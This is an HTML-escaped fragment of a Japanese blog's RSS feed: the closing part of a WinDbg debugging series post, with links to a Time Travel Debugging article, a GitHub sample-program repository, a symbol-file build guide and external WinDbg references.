&lt;h3 id=&quot;アプリケーションエラーの原因調査&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%AE%E5%8E%9F%E5%9B%A0%E8%AA%BF%E6%9F%BB&quot; aria-label=&quot;アプリケーションエラーの原因調査 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;アプリケーションエラーの原因調査&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;/windows-windbg-008-time-travel-debugging&quot;&gt;Time Travel Debuggingで始める新しいデバッグ手法&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;補足&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%A3%9C%E8%B6%B3&quot; aria-label=&quot;補足 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;補足&lt;/h2&gt;
&lt;p&gt;各記事で解析のために使用しているサンプルプログラムは、いずれも以下のリポジトリに置いてあります。&lt;/p&gt;
&lt;p&gt;サンプルプログラム：&lt;a href=&quot;https://github.com/kash1064/Try2WinDbg&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/Try2WinDbg&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;リポジトリ内のサンプルプログラムをシンボルファイル（.pdb）付きでコンパイルする方法については、以下の記事にまとめています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-006-symbol&quot;&gt;llvm-mingwを使ってLinux環境でもシンボルファイル（.pdb）を作成する方法&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;外部参考資料&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%A4%96%E9%83%A8%E5%8F%82%E8%80%83%E8%B3%87%E6%96%99&quot; aria-label=&quot;外部参考資料 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;外部参考資料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Debugging Tools for Windows (WinDbg、KD、CDB、NTSD) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://techinfoofmicrosofttech.osscons.jp/index.php?WinDbg&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WinDbg - マイクロソフト系技術情報 Wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://windbg.info/download/doc/pdf/WinDbg_A_to_Z_color_JP.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WinDbg. From A to Z!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://windbg.info/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Welcome to WinDbg.info&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3KTG0e9&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windowsカーネルドライバプログラミング&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item></channel></rss>